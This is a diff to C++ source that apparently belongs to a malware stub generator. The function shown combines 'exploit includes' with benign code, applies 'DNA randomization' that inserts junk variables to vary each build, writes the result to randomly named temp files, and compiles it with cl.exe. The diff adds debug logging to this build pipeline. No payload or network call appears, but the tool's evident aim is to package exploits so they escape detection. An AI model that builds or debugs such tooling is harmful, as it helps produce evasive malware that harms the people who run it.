@@ -1783,6 +1783,14 @@ public:
                 exploitIncludes = exploitEngine.getExploitIncludes(exploitType);
             }
             
+            // DEBUG: Log code generation start
+            std::ofstream debugLog("debug_stub_generation.txt", std::ios::app);
+            debugLog << "=== STUB GENERATION DEBUG ===\n";
+            debugLog << "Company: " << company.name << "\n";
+            debugLog << "Exploit Type: " << (int)exploitType << "\n";
+            debugLog << "Exploit Includes Length: " << exploitIncludes.length() << "\n";
+            debugLog << "Benign Code Length: " << benignCode.length() << "\n";
+            
             // Create a simple, working combined code structure
             std::string combinedCode = exploitIncludes + "\n";
             combinedCode += benignCode + "\n\n";
@@ -1793,17 +1801,30 @@ public:
             combinedCode += "    return 0;\n";
             combinedCode += "}\n";
             
+            debugLog << "Combined Code Length: " << combinedCode.length() << "\n";
+            
             // Apply DNA randomization (this adds junk variables safely)
-            combinedCode = dnaRandomizer.randomizeCode(combinedCode);
+            try {
+                combinedCode = dnaRandomizer.randomizeCode(combinedCode);
+                debugLog << "DNA randomization: SUCCESS\n";
+            } catch (...) {
+                debugLog << "DNA randomization: FAILED\n";
+            }
             
             // Create temporary source file
             std::string tempSource = "temp_" + randomEngine.generateRandomName() + ".cpp";
+            debugLog << "Temp source file: " << tempSource << "\n";
+            
             std::ofstream sourceFile(tempSource);
             if (!sourceFile.is_open()) {
+                debugLog << "ERROR: Could not create source file\n";
+                debugLog.close();
                 return false;
             }
             sourceFile << combinedCode;
             sourceFile.close();
+            
+            debugLog << "Source file written successfully\n";
             
             // Simple compiler detection - just use system cl.exe
             auto compilerInfo = CompilerDetector::detectVisualStudio();
@@ -1835,17 +1856,49 @@ public:
             compileCmd += "/link " + archFlags + " /OPT:REF /OPT:ICF ";
             compileCmd += "user32.lib kernel32.lib advapi32.lib shell32.lib ole32.lib";
             
+            // DEBUG: Log compilation details
+            debugLog << "Compilation command: " << compileCmd << "\n";
+            debugLog << "Command length: " << compileCmd.length() << "\n";
+            debugLog.close();
+            
+            // Write compilation command to separate file for inspection
+            std::ofstream cmdFile("debug_compile_command.txt");
+            cmdFile << compileCmd;
+            cmdFile.close();
+            
             // Execute compilation
+            debugLog.open("debug_stub_generation.txt", std::ios::app);
+            debugLog << "Starting compilation...\n";
+            debugLog.close();
+            
             int result = system(compileCmd.c_str());
             
-            // Don't clean up temporary file for debugging
-            // DeleteFileA(tempSource.c_str());
+            // DEBUG: Log compilation result
+            debugLog.open("debug_stub_generation.txt", std::ios::app);
+            debugLog << "Compilation result: " << result << "\n";
             
             if (result == 0) {
-                return true;
+                debugLog << "SUCCESS: Compilation completed\n";
+                // Check if output file exists
+                DWORD attrs = GetFileAttributesA(outputPath.c_str());
+                if (attrs != INVALID_FILE_ATTRIBUTES) {
+                    debugLog << "SUCCESS: Output file created: " << outputPath << "\n";
+                } else {
+                    debugLog << "WARNING: Compilation succeeded but no output file found\n";
+                }
+            } else {
+                debugLog << "ERROR: Compilation failed with code " << result << "\n";
+                debugLog << "Check temp file: " << tempSource << "\n";
+                debugLog << "Command file: debug_compile_command.txt\n";
             }
             
-            return false;
+            debugLog << "=== END DEBUG ===\n\n";
+            debugLog.close();
+            
+            // Don't clean up temporary files for debugging
+            // DeleteFileA(tempSource.c_str());
+            
+            return (result == 0);
             
         } catch (...) {
             return false;
